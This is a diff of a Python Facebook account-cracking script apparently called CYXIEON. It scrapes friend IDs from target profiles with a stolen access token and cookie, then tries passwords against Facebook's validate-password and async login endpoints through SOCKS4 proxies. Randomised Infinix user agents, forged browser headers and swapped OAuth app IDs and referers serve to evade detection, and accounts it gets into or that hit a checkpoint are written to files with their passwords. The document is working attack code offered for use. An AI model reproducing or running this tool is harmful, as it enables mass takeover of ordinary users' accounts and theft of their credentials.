@@ -43,34 +43,23 @@ method, ugen = [],[]
 loop, ok, cp = 0,0,0
 
 #----------[ USER-CRACK ]----------#  
+infinix = random.choice(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])
+
 for Xr in range (10000):	
 	a='Mozilla/5.0 (Linux; Android'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	e=random.randrange(40,99)
+	b=random.randrange(5, 13)
+	c='Build/'
+	d='0'
+	e=random.randrange(1,13)
 	f='0'
-	g=random.randrange(3000,4999)
-	h=random.randrange(97,114)
-	i='Mobile Safari/537.36'
-	uaku=(f'{a} {b}.{c}) {d}{e}.{f}.{g}.{h} {i}')
-	ugen.append(uaku)
-	
-for Xr in range (10000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(5, 19)
-	f='DOOGEE' 
-	g='Build/MRA58K)'
+	g=random.randrange(8,20)
 	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	i=random.randrange(40,99)
+	i=random.randrange(73,112)
 	j='0'
-	k=random.randrange(3000,4999)
-	l=random.randrange(97,114)
-	m='Mobile Safari/537.36'
-	uaku=(f'{a} {b}.{c}; {f} {d}{e} {g} {h}{i}.{j}.{k} {m}')
+	k=random.randrange(4200,4900)
+	l=random.randrange(40,150)
+	m='Mobile Safari/534.36'
+	uaku=(f'{a} {b}; {infinix} {c}{d}{e}{f}{g}) {h}{i}.{j}.{k}.{l} {m}')
 	ugen.append(uaku)
 
 #--------[ GENERATE-USER-AGENT ]----------#
@@ -218,7 +207,7 @@ def menu():
         print(f'{kun}└──[{puti} 01. Crack publik ')
         print(f'{kun}└──[{puti} 02. Cek hasil OK ')
         print(f'{kun}└──[{puti} 03. Cek hasil CP ')
-        print(f'{kun}└──[{puti} 04. Ganti cokies ')
+        print(f'{kun}└──[{puti} 00. Ganti cokies ')
         print(f"{kun}╭────────────────────────────────────────────{puti}")
         CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
         if CYXIEON_GANTENG in ['01','1']:
@@ -227,7 +216,7 @@ def menu():
             hasil_ok()
         elif CYXIEON_GANTENG in ['03','3']:
             hasil_cp()
-        elif CYXIEON_GANTENG in ['04','4']:
+        elif CYXIEON_GANTENG in ['00','0']:
             ganti_cokies()
             print(f"{kun}╭────────────────────────────────────────────{puti}")
             print(f"{kun}└──[{mer} Berhasil Hapus Cokies ")  
@@ -259,11 +248,11 @@ def crack_publik():
 	for KOTG49H in range(kumpulkan):
 		bilangan+=1
 		print(f"{kun}╭────────────────────────────────────────────{puti}")
-		Masukan = input(f'{kun}└──[{puti} Target ke '+str(bilangan)+f' {hijo}: ')
+		Masukan = input(f'{kun}└──[{puti} Target ke '+str(bilangan)+f' :{hijo} ')
 		uid.append(Masukan)
 	for user in uid:
 	    try:
-	       graph = ses.get('https://graph.facebook.com/v17.0/'+user+'?fields=friends.limit(999999999)&access_token='+tokene[0], cookies = {'cookies':cok}).json()
+	       graph = ses.get('https://graph.facebook.com/v11.0/'+user+'?fields=friends.limit(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)&access_token='+tokene[0], cookies = {'cookies':cok}).json()
 	       for xr in graph['friends']['data']:
 	           try:
 	               gmail = (xr['id']+'|'+xr['name'])
@@ -277,7 +266,7 @@ def crack_publik():
 	          exit(f"{kun}└──[{mer} Koneksi Problem ")
 	try:
 	      print(f"{kun}╭────────────────────────────────────────────{puti}")
-	      print(f'{kun}└──[{puti} Total target {hijo}: '+str(len(id)))
+	      print(f'{kun}└──[{puti} Total target :{hijo} '+str(len(id)))
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	      print(f"{kun}╭────────────────────────────────────────────{puti}")
@@ -476,7 +465,7 @@ def crackvalidate(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot} V %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
+	prog.update(des,description=f"\r {emot} VALIDATE (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -496,12 +485,12 @@ def crackvalidate(idf,pwx,url):
 	        }     
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
+			ver = rc(["ms-MY,ms;q=0.9","fr_FR,fr;q=0.9"])  		
 			head={'Host': url,
 	        'cache-control': 'max-age=0',
-	        'dpr': f'{str(rr(1,9))}',
+	        'dpr': f'{str(rr(1,5))}',
 	        'viewport-width': f'{str(rr(400,999))}',
-	        'sec-ch-ua': f'"Chromium";v="{str(rr(99,115))}", "Google Chrome";v="{str(rr(99,115))}", "Not:A-Brand";v="{str(rr(8,20))}"',
+	        'sec-ch-ua': f'"Chromium";v="{str(rr(110,115))}", "Google Chrome";v="{str(rr(110,115))}", "Not:A-Brand";v="{str(rr(8,20))}"',
 	        'sec-ch-ua-mobile': '?1',
 	        'sec-ch-ua-platform': '"Android"',
 	        'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
@@ -514,12 +503,13 @@ def crackvalidate(idf,pwx,url):
 	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	        'x-requested-with': 'XMLHttpRequest',
 	        'sec-fetch-site': 'same-origin',
-	        'sec-fetch-mode': 'cros',
+	        'sec-fetch-mode': 'cors',
 	        'sec-fetch-user': '?1',
 	        'sec-fetch-dest': 'empty',
 	        'referer': ref,
 	        'accept-encoding': 'gzip, deflate, br',
-	        'accept-language': f'{ver},en-US;q=0.8,en;q=0.7'}
+	        'connection': 'close',
+	        'accept-language': ver}
 			rdm = rc(["id_ID","jv_ID","id_ID_ID","jv_ID_ID"])
 			links = rc([f"https://{url}/login/device-based/validate-password/?shbl=0&locale2={rdm}"])
 			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
@@ -540,8 +530,8 @@ def crackvalidate(idf,pwx,url):
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
-				tree.add(f"{mer}{ua}{hijo}")
+				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
+				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -563,7 +553,7 @@ def crackreguler(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot} R %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
+	prog.update(des,description=f"\r {emot} REGULER (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -623,8 +613,8 @@ def crackreguler(idf,pwx,url):
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
-				tree.add(f"{mer}{ua}{hijo}")
+				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
+				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -646,7 +636,7 @@ def crackasyinc(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot} A %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
+	prog.update(des,description=f"\r {emot} ASYINC (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -656,8 +646,8 @@ def crackasyinc(idf,pwx,url):
 			proxs = {'http': 'socks4://'+nip}
 			ua = rc(ugen)
 			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
-			ref = rc(["https://free.facebook.com/v11.0/dialog/oauth?app_id=2099441543493930&cbt=1694016682169&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa031ad37b7cfc%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff1c8f0ce4c4803c%26relation%3Dopener&client_id=2099441543493930&display=touch&domain=account.hoyoverse.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Faccount.hoyoverse.com%2F%3Flang%3Did%23%2Flogin%3Fcb_route%3D%252Faccount%252FaccountInfo&locale=id_ID&logger_id=ff8a9c507c4f28&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4fe7221d2314%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff1c8f0ce4c4803c%26relation%3Dopener%26frame%3Df397f4a437b8a4c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v11.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified"])
-			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=2099441543493930&kid_directed_site=0&app_id=2099441543493930&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			ref = rc([f"https://{url}/login.php?skip_api_login=1&api_key=266809897176355&kid_directed_site=0&app_id=266809897176355&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
+			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=266809897176355&kid_directed_site=0&app_id=266809897176355&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
 			'had_cp_prefilled': 'false',
 			'had_password_prefilled': 'false',
@@ -682,7 +672,7 @@ def crackasyinc(idf,pwx,url):
 			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
 			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
 			"x-asbd-id": "129477",
-			"x-requested-with": "com.android.chrome",
+			"x-requested-with": "XMLHttpRequest",
 			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
 			"sec-ch-prefers-color-scheme": "light",
 			"sec-ch-ua-platform": '"Android"',
@@ -694,7 +684,7 @@ def crackasyinc(idf,pwx,url):
 			"referer": ref,
 			"accept-encoding": "gzip, deflate, br",
 			"accept-language": ver}		
-			links = rc([f"https://{url}/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"])
+			links = rc([f"https://{url}/login/device-based/login/async/?api_key=266809897176355&auth_token=9e74c10df302b317fb711eeb7b478dc4&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D266809897176355%26cbt%3D1694956577376%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df26dedb14c84ab%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%26client_id%3D266809897176355%26display%3Dtouch%26domain%3Dwww.signupgenius.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Fregister%26locale%3Den_US%26logger_id%3Df2de2085933efa%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2785f21139e0cc%2526domain%253Dwww.signupgenius.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.signupgenius.com%25252Ff1e4e76b83b13a%2526relation%253Dopener%2526frame%253Df380e29c31da6c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv7.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=266809897176355&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2785f21139e0cc%26domain%3Dwww.signupgenius.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.signupgenius.com%252Ff1e4e76b83b13a%26relation%3Dopener%26frame%3Df380e29c31da6c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"])
 			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
@@ -713,8 +703,8 @@ def crackasyinc(idf,pwx,url):
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
-				tree.add(f"{mer}{ua}{hijo}")
+				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
+				tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -733,7 +723,7 @@ def crackasyinc(idf,pwx,url):
 def ceker(idf,pw):
 	global cp
 	rc = random.choice
-	url = rc(["mbasic.facebook.com"])
+	url = rc(["free.facebook.com"])
 	head = {"Host": url,
 "cache-control": "max-age=0",
 "upgrade-insecure-requests": "1",
